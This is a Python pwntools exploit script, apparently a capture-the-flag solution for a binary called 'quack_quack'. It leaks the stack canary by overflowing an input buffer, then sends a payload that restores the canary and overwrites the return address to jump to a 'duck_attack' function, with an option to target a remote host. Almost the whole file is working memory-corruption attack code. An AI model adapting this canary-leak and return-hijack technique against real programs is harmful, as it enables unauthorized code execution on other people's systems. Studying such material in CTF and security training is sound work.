#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('quack_quack')
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4015A7
b *0x401567
continue
'''.format(**locals())

p = start()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def exploit():

    prefix = b"Quack Quack "
    pad = b"A"*89 + prefix

    p.sendafter(b">", pad)

    p.recvuntil(b"Quack Quack ")
    canary = u64(p.recv(8)[:7].rjust(8, b"\x00"))
    info("canary: %#x", canary)

    offset = 88
    payload = flat({
        offset: [
            canary,
            b"A"*8,
            exe.sym["duck_attack"]
        ]
    })

    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    exploit()